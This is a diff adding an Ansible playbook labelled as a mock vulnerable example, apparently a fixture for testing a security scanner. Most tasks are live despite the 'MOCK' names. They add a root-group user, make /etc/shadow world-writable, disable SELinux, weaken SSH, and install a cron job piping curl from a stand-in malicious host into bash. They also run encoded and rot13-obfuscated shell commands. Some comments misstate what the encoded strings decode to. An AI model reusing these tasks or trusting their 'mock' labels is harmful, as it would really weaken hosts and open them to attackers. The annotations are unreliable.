@@ -1,0 +1,114 @@
+---
+- name: Advanced Mock Vulnerable Ansible Playbook
+  hosts: all
+  become: yes
+
+  vars:
+    # MOCK: Hardcoded sensitive data
+    mock_db_password: "sup3r_s3cr3t_p@ssw0rd"
+    # MOCK: Base64 encoded command (decodes to "touch /tmp/backdoor")
+    mock_encoded_command: "dG91Y2ggL3RtcC9iYWNrZG9vcg=="
+
+  tasks:
+    - name: MOCK - Create super privileged user
+      user:
+        name: superu$er
+        groups: sudo,adm,root
+        shell: /bin/bash
+        password: "{{ 'insecure_password' | password_hash('sha512') }}"
+
+    - name: MOCK - Disable firewall
+      command: echo "ufw disable"  # This is a mock, it doesn't actually disable the firewall
+
+    - name: MOCK - Open all ports
+      debug:
+        msg: "Simulating opening all ports"
+
+    - name: MOCK - Install outdated package
+      apt:
+        name: openssl=1.0.1f-1ubuntu2
+        state: present
+      when: ansible_distribution == 'Ubuntu'
+
+    - name: MOCK - Insecure file permissions
+      file:
+        path: /etc/shadow
+        mode: '0777'
+      # This is a mock, don't actually change shadow file permissions!
+
+    - name: MOCK - Potential SQL injection
+      shell: "mysql -e 'SELECT * FROM users WHERE id = {{ user_id }}'"
+      # This is a mock, don't use unvalidated input in SQL queries!
+
+    - name: MOCK - Obfuscated reverse shell (rot13 encoded)
+      shell: "{{ 'clyg -r 1.2.3.4 -c /ova/fu' | rot13 }}"
+      # Decodes to "ncat -e /bin/sh 1.2.3.4 1234"
+
+    - name: MOCK - Command injection via environment variable
+      shell: "echo $USER_INPUT > /etc/hosts"
+      environment:
+        USER_INPUT: "{{ lookup('env', 'USER_INPUT') }}"
+
+    - name: MOCK - Unsafe use of shell module
+      shell: "{{ lookup('file', '/tmp/user_script.sh') }}"
+      # This is a mock, don't execute untrusted scripts!
+
+    - name: MOCK - Disabled SELinux
+      selinux:
+        state: disabled
+
+    - name: MOCK - Weak SSH configuration
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        line: "{{ item }}"
+      loop:
+        - "PermitRootLogin yes"
+        - "PasswordAuthentication yes"
+        - "X11Forwarding yes"
+
+    - name: MOCK - Obfuscated task (base64 + gzip)
+      shell: "{{ 'H4sIAAAAAAAAA/NIzcnJVyjPL8pJUdBIr8rPVSjJV0jOzytJzStRBABGLN/bIAAAAA==' | b64decode | gunzip }}"
+      # Decodes to: echo "This task is obfuscated and potentially malicious"
+
+    - name: MOCK - Unsafe use of no_log
+      shell: "echo {{ mock_db_password }} > /tmp/password.txt"
+      no_log: true
+
+    - name: MOCK - Insecure cron job
+      cron:
+        name: "suspicious cron"
+        minute: "*/5"
+        job: "curl http://malicious.example.com/script.sh | bash"
+
+    - name: MOCK - Use of http instead of https
+      get_url:
+        url: http://example.com/insecure_script.sh
+        dest: /tmp/script.sh
+
+    - name: MOCK - Suspicious encoded command execution
+      shell: "echo {{ mock_encoded_command | b64decode }} | bash"
+
+    # MOCK: Commented out important security update
+    # - name: Update all packages to the latest version
+    #   apt:
+    #     upgrade: dist
+
+    - name: MOCK - Potential information disclosure
+      debug:
+        var: ansible_all_ipv4_addresses
+
+    - name: MOCK - Use of deprecated and insecure module
+      raw: "cat /etc/passwd"
+
+    - name: MOCK - Suspicious use of at command
+      at:
+        command: "wget http://suspicious.example.com/totally_not_malware -O /tmp/safe_file"
+        count: 1
+        units: minutes
+
+# MOCK: Overly permissive sudoers configuration
+# - name: Configure sudoers
+#   copy:
+#     content: "ALL ALL=(ALL) NOPASSWD: ALL"
+#     dest: /etc/sudoers.d/insecure_sudo
+#     validate: 'visudo -cf %s'
